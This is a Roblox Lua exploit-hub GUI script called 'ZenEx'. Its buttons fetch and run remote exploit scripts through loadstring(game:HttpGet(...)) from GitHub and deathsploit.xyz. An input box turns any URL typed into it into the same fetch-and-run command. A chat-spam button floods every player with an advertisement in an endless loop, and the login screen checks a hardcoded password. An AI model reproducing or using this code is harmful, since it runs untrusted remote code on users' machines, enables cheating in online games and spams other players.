-- random code im bored so im writing lol

-- Gui to Lua
-- Version: 3.2

-- Instances:

local NTG = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local Gradient = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local UICorner_3 = Instance.new("UICorner")
local DarkHub = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local FatesAdmin = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local execute = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local DSX = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local ChatSpam = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local UICorner_9 = Instance.new("UICorner")
local PlayerName = Instance.new("TextLabel")
local string = Instance.new("TextBox")
local UICorner_10 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local ChangeLogs = Instance.new("TextLabel")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local logsystem = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local UICorner_13 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local Username = Instance.new("TextBox")
local UICorner_15 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local Password = Instance.new("TextBox")
local UICorner_16 = Instance.new("UICorner")

--Properties:

NTG.Name = "NTG"
NTG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

main.Name = "main"
main.Parent = NTG
main.Active = true
main.BackgroundColor3 = Color3.fromRGB(104, 67, 141)
main.Position = UDim2.new(0.278877556, 0, 0.293622226, 0)
main.Size = UDim2.new(0, 525, 0, 31)
main.Active = true
main.Draggable = true

UICorner.Parent = main

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(118, 185, 232)
TextLabel.Position = UDim2.new(-0.0399999991, 0, 0.110071979, 0)
TextLabel.Size = UDim2.new(0, 558, 0, 25)
TextLabel.Font = Enum.Font.LuckiestGuy
TextLabel.LineHeight = 0.880
TextLabel.Text = "(DPA) ZenEx                                                             bkroblox.xyz/droppurity.xyz"
TextLabel.TextColor3 = Color3.fromRGB(62, 255, 139)
TextLabel.TextSize = 13.000

UICorner_2.Parent = TextLabel

Gradient.Name = "Gradient"
Gradient.Parent = main
Gradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Gradient.BorderColor3 = Color3.fromRGB(27, 42, 53)
Gradient.BorderSizePixel = 0
Gradient.Position = UDim2.new(-0.000409458706, 0, 0.826317549, 0)
Gradient.Size = UDim2.new(0, 524, 0, 283)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(182, 141, 159)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(64, 96, 161))}
UIGradient.Parent = Gradient

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = Gradient

DarkHub.Name = "DarkHub"
DarkHub.Parent = Gradient
DarkHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarkHub.Position = UDim2.new(0.0118165743, 0, 0.0775494128, 0)
DarkHub.Size = UDim2.new(0, 146, 0, 26)
DarkHub.Font = Enum.Font.SourceSans
DarkHub.Text = "Dark Hub"
DarkHub.TextColor3 = Color3.fromRGB(0, 0, 0)
DarkHub.TextSize = 14.000
DarkHub.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)

UICorner_4.Parent = DarkHub

FatesAdmin.Name = "FatesAdmin"
FatesAdmin.Parent = Gradient
FatesAdmin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FatesAdmin.Position = UDim2.new(0.012875542, 0, 0.182613447, 0)
FatesAdmin.Size = UDim2.new(0, 146, 0, 26)
FatesAdmin.Font = Enum.Font.SourceSans
FatesAdmin.Text = "Fates Admin"
FatesAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
FatesAdmin.TextSize = 14.000
FatesAdmin.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://deathsploit.xyz/custom1.lua", true))()
end)

UICorner_5.Parent = FatesAdmin

execute.Name = "execute"
execute.Parent = Gradient
execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
execute.Position = UDim2.new(0.0240853429, 0, 0.763250887, 0)
execute.Size = UDim2.new(0, 146, 0, 18)
execute.Font = Enum.Font.SourceSans
execute.Text = "execute"
execute.TextColor3 = Color3.fromRGB(0, 0, 0)
execute.TextSize = 14.000

UICorner_6.Parent = execute

DSX.Name = "DSX"
DSX.Parent = Gradient
DSX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DSX.Position = UDim2.new(0.012875542, 0, 0.287526518, 0)
DSX.Size = UDim2.new(0, 146, 0, 26)
DSX.Font = Enum.Font.SourceSans
DSX.Text = "Deathsploit X (outdated.)"
DSX.TextColor3 = Color3.fromRGB(0, 0, 0)
DSX.TextSize = 14.000
DSX.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://deathsploit.xyz/deathsploitx.lua", true))()
end)


UICorner_7.Parent = DSX

ChatSpam.Name = "ChatSpam"
ChatSpam.Parent = Gradient
ChatSpam.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChatSpam.Position = UDim2.new(0.0122658052, 0, 0.396618068, 0)
ChatSpam.Size = UDim2.new(0, 146, 0, 26)
ChatSpam.Font = Enum.Font.SourceSans
ChatSpam.Text = "Chat Spammer"
ChatSpam.TextColor3 = Color3.fromRGB(0, 0, 0)
ChatSpam.TextSize = 14.000
ChatSpam.MouseButton1Down:Connect(function()
	while true do wait(2) 

		local A_1 = "Hello! Do you want to stop the raids completely? DPA announces RAIDSTOP a product that allows you to INSTANTLY stop any raid for a certain amount of time. see droppurity.xyz for more info." local A_2 = "All" 
		local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) end
end)

UICorner_8.Parent = ChatSpam

ImageLabel.Parent = Gradient
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.315304488, 0, 0.0831761956, 0)
ImageLabel.Size = UDim2.new(0, 49, 0, 48)
ImageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UICorner_9.Parent = ImageLabel

PlayerName.Name = "PlayerName"
PlayerName.Parent = Gradient
PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayerName.BackgroundTransparency = 1.000
PlayerName.Position = UDim2.new(0.410589695, 0, 0.117148027, 0)
PlayerName.Size = UDim2.new(0, 86, 0, 28)
PlayerName.Font = Enum.Font.LuckiestGuy
PlayerName.LineHeight = 0.750
PlayerName.Text = "Username"
PlayerName.TextColor3 = Color3.fromRGB(0, 0, 0)
PlayerName.TextSize = 14.000

string.Name = "string"
string.Parent = Gradient
string.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
string.Position = UDim2.new(0.0248091593, 0, 0.855123699, 0)
string.Size = UDim2.new(0, 284, 0, 19)
string.Font = Enum.Font.SourceSans
string.Text = ""
string.TextColor3 = Color3.fromRGB(0, 0, 0)
string.TextSize = 14.000

UICorner_10.Parent = string

TextLabel_2.Parent = main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.1800735, 0, 9.46869087, 0)
TextLabel_2.Size = UDim2.new(0, 332, 0, 15)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Note: This GUI automatically updates based on recommended scripts in the discord."
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 11.000

TextLabel_3.Parent = main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0245849602, 0, 0.899712324, 0)
TextLabel_3.Size = UDim2.new(0, 227, 0, 18)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Developed by Craxtic#0001 any issues? DM me."
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000

ChangeLogs.Name = "ChangeLogs"
ChangeLogs.Parent = main
ChangeLogs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChangeLogs.Position = UDim2.new(0.619975924, 0, 1.61290324, 0)
ChangeLogs.Size = UDim2.new(0, 191, 0, 18)
ChangeLogs.Font = Enum.Font.SourceSans
ChangeLogs.Text = "Changelogs - SOON."
ChangeLogs.TextColor3 = Color3.fromRGB(0, 0, 0)
ChangeLogs.TextSize = 14.000

UICorner_11.Parent = ChangeLogs

TextLabel_4.Parent = main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.00952380896, 0, 6.67741919, 0)
TextLabel_4.Size = UDim2.new(0, 177, 0, 24)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "not finished so dont try using"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextSize = 14.000

logsystem.Name = "logsystem"
logsystem.Parent = NTG
logsystem.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
logsystem.Position = UDim2.new(0.409712344, 0, 0.423586011, 0)
logsystem.Size = UDim2.new(0, 230, 0, 126)
logsystem.Visible = false

UICorner_12.Parent = logsystem

TextLabel_5.Parent = logsystem
TextLabel_5.BackgroundColor3 = Color3.fromRGB(93, 93, 93)
TextLabel_5.BorderColor3 = Color3.fromRGB(130, 203, 255)
TextLabel_5.Size = UDim2.new(0, 230, 0, 17)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Log In System - ZenEx By Craxtic#0001"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextSize = 14.000

UICorner_13.Parent = TextLabel_5

TextButton.Parent = logsystem
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0.25154525, 0, 0.696253479, 0)
TextButton.Size = UDim2.new(0, 114, 0, 19)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Enter"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

UICorner_14.Parent = TextButton

Username.Name = "Username"
Username.Parent = logsystem
Username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Username.Position = UDim2.new(0.0645887256, 0, 0.279820263, 0)
Username.Size = UDim2.new(0, 200, 0, 15)
Username.Font = Enum.Font.SourceSans
Username.Text = "Username"
Username.TextColor3 = Color3.fromRGB(0, 0, 0)
Username.TextSize = 14.000

UICorner_15.Parent = Username

TextLabel_6.Parent = logsystem
TextLabel_6.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
TextLabel_6.BorderColor3 = Color3.fromRGB(130, 203, 255)
TextLabel_6.Position = UDim2.new(0, 0, 0.214285716, 0)
TextLabel_6.Size = UDim2.new(0, 230, 0, 0)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = ""
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextSize = 14.000

Password.Name = "Password"
Password.Parent = logsystem
Password.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Password.Position = UDim2.new(0.0645887256, 0, 0.438550413, 0)
Password.Size = UDim2.new(0, 200, 0, 15)
Password.Font = Enum.Font.SourceSans
Password.Text = ""
Password.TextColor3 = Color3.fromRGB(0, 0, 0)
Password.TextSize = 14.000

UICorner_16.Parent = Password

-- Scripts:

local function CJPFLTE_fake_script() -- execute.LocalScript 
	local script = Instance.new('LocalScript', execute)

	script.Parent.MouseButton1Click:Connect(function()
		string.Text = "loadstring(game:HttpGet('"..string.Text.."'))()"
	end)
end
coroutine.wrap(CJPFLTE_fake_script)()
local function PEFP_fake_script() -- ImageLabel.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel)

	local Players = game:GetService("Players")

	local player = Players.LocalPlayer

	localuserid = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content, IsReady = Players:GetUserThumbnailAsync(localuserid, thumbType, thumbSize)

	local ImageLabel = script.Parent
	ImageLabel.Image = content
end
coroutine.wrap(PEFP_fake_script)()
local function FSKN_fake_script() -- PlayerName.LocalScript 
	local script = Instance.new('LocalScript', PlayerName)

	local player = game.Players.LocalPlayer

	if player then
		script.Parent.Text = ""..player.Name..""
	end

end
coroutine.wrap(FSKN_fake_script)()
local function LMQLQZ_fake_script() -- Password.LocalScript 
	local script = Instance.new('LocalScript', Password)

	if Password.Text == "charged" then
		logsystem.Visible = false
		main.Visible = true
		main.Active = true

	end
end
coroutine.wrap(LMQLQZ_fake_script)()
